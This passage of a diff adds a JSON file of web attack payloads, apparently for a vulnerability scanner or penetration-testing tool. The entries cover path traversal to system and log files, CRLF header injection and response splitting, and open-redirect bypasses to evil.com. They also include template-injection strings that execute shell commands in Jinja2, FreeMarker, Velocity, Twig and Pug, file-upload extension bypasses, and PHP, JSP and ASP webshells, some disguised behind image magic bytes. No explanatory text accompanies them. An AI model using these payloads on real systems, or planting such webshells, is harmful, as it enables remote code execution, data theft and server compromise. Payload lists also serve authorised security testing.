+        "/var/log/nginx/error.log",
+        "/var/log/httpd/access_log",
+        "/var/log/httpd/error_log",
+        "/proc/self/environ",
+        "/proc/self/fd/10",
+        "/proc/self/fd/11",
+        "/var/log/auth.log",
+        "/var/log/syslog"
+      ],
+      "windows_paths": [
+        "..\\..\\..\\windows\\win.ini",
+        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "....\\\\....\\\\....\\\\windows\\\\win.ini",
+        "..%5c..%5c..%5cwindows%5cwin.ini",
+        "..%255c..%255c..%255cwindows%255cwin.ini",
+        "C:\\windows\\win.ini",
+        "C:/windows/win.ini",
+        "/windows/win.ini"
+      ]
+    },
+    "crlf": {
+      "basic": [
+        "%0d%0a",
+        "%0D%0A",
+        "\\r\\n",
+        "\\r\\n",
+        "%0d%0a%0d%0a",
+        "%E5%98%8A%E5%98%8D"
+      ],
+      "header_injection": [
+        "%0d%0aInjected-Header:value",
+        "%0d%0aSet-Cookie:session=evil",
+        "%0d%0aLocation:http://evil.com",
+        "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>"
+      ],
+      "response_splitting": [
+        "%0d%0a%0d%0a<script>alert(1)</script>",
+        "%0d%0aX-Injected-Header:value%0d%0a%0d%0a<html>evil</html>",
+        "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>evil</html>"
+      ],
+      "bypass": [
+        "%e5%98%8a%e5%98%8d",
+        "%c0%8d%c0%8a",
+        "%0d%0a",
+        "%5cr%5cn",
+        "%0D%0A",
+        "%13%10",
+        "%E5%98%8A%E5%98%8D"
+      ]
+    },
+    "open_redirect": {
+      "basic": [
+        "http://evil.com",
+        "//evil.com",
+        "/\\evil.com",
+        "/\\evil.com",
+        "http:evil.com",
+        "https:evil.com",
+        "javascript:alert(1)",
+        "data:text/html,<script>alert(1)</script>"
+      ],
+      "bypass": [
+        "http://legitimate.com@evil.com",
+        "http://legitimate.com%00@evil.com",
+        "http://evil.com%00.legitimate.com",
+        "http://evil.com#.legitimate.com",
+        "http://legitimate.com\\.evil.com",
+        "http://evil.com%2523.legitimate.com",
+        "//evil.com%252f",
+        "/\\evil.com%2f",
+        "http://evil%00.com",
+        "http://evil.com%0d%0aLocation:http://evil.com",
+        "http://evil.com@legitimate.com"
+      ],
+      "encoding": [
+        "%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
+        "http://evil%2ecom",
+        "http://evil.com%0a",
+        "http://evil.com%0d",
+        "http://evil.com%09",
+        "http://evil.com%00"
+      ],
+      "parser_discrepancies": [
+        "http://evil.com%0d.legitimate.com",
+        "http://evil.com%0a.legitimate.com",
+        "http://evil.com%0d%0a.legitimate.com",
+        "http://legitimate.com@evil.com",
+        "http://legitimate.com#@evil.com",
+        "http://legitimate.com\\@evil.com",
+        "http://evil.com:80@legitimate.com",
+        "http://evil.com#@legitimate.com"
+      ]
+    },
+    "template_injection": {
+      "detection": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "{{7*'7'}}",
+        "${7*'7'}",
+        "<%= 7*'7' %>",
+        "#{7*'7'}"
+      ],
+      "jinja2": [
+        "{{config.items()}}",
+        "{{self.__class__.__mro__[1].__subclasses__()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()[213]('id',shell=True,stdout=-1).communicate()}}",
+        "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config.items()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
+        "{{lipsum.__globals__['os'].popen('id').read()}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{request.__class__.__mro__[1].__subclasses__()[213]('id',shell=True,stdout=-1).communicate()}}"
+      ],
+      "freemarker": [
+        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+        "<#assign classloader=object.class.protectionDomain.classLoader><#assign owc=classloader.loadClass('freemarker.template.ObjectWrapper')><#assign dwf=owc.DEFAULT_WRAPPER><#assign ec=classloader.loadClass('freemarker.template.utility.Execute')>${dwf.newInstance(ec)('id')}",
+        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}",
+        "<#assign classloader=object.class.protectionDomain.classLoader><#assign owc=classloader.loadClass('freemarker.template.ObjectWrapper')><#assign dwf=owc.DEFAULT_WRAPPER><#assign ec=classloader.loadClass('freemarker.template.utility.Execute')><#assign cr=classloader.loadClass('freemarker.template.utility.ConsoleRedirect')>${dwf.newInstance(ec)('id')}"
+      ],
+      "velocity": [
+        "#set($class=$class.forName('java.lang.Runtime'))",
+        "#set($chr=$class.forName('java.lang.Character'))",
+        "#set($str=$class.forName('java.lang.String'))",
+        "#set($ex=$class.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end"
+      ],
+      "twig": [
+        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+        "{{['id']|filter('system')}}",
+        "{{['cat /etc/passwd']|filter('system')}}",
+        "{{['ls -la']|filter('system')}}",
+        "{{app.request.server.all|join(',')}}",
+        "{{_self.env.getFunction('max')({'0':system('id')})}}"
+      ],
+      "pug": [
+        "| #{global.process.mainModule.require('child_process').execSync('id')}",
+        "- global.process.mainModule.require('child_process').execSync('id')",
+        "| !{global.process.mainModule.require('child_process').execSync('id')}"
+      ]
+    },
+    "file_upload": {
+      "extension_bypass": [
+        "shell.php", "shell.php.jpg", "shell.php%00.jpg",
+        "shell.php5", "shell.phtml", "shell.pht",
+        "shell.php.jpg.php", "shell.php.png.php",
+        "shell.PHP", "shell.PhP", "shell.pHp",
+        "shell.php;.jpg", "shell.php%0a.jpg",
+        "shell.php::$DATA", "shell.php.",
+        "shell.php ", "shell.php\t",
+        "shell.php\n", "shell.php\r",
+        "shell.php\u200b", "shell.php\u2060"
+      ],
+      "content_type_bypass": [
+        "Content-Type: image/jpeg",
+        "Content-Type: image/png",
+        "Content-Type: image/gif",
+        "Content-Type: application/x-php",
+        "Content-Type: application/octet-stream",
+        "Content-Type: text/plain"
+      ],
+      "magic_bytes": [
+        "GIF89a<?php system($_GET['cmd']); ?>",
+        "PNG\\x0d\\x0a\\x1a\\x0a<?php system($_GET['cmd']); ?>",
+        "\\xff\\xd8\\xff\\xe0<?php system($_GET['cmd']); ?>",
+        "BM<?php system($_GET['cmd']); ?>"
+      ],
+      "webshell_variants": [
+        "<?php system($_GET['cmd']); ?>",
+        "<?php eval($_POST['cmd']); ?>",
+        "<?php echo shell_exec($_GET['cmd']); ?>",
+        "<?php passthru($_GET['cmd']); ?>",
+        "<?php $a='sys'.'tem';$a($_GET['cmd']); ?>",
+        "<?php $_GET['a']($_GET['b']); ?>",
+        "<%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+        "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+        "<script language='JScript' runat='server'>var r = new ActiveXObject(\"WScript.Shell\");r.Exec(\"cmd /c \" + Request(\"cmd\"));</script>",
+        "<%response.write(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next())%>"
+      ]
+    }
+  }
+}
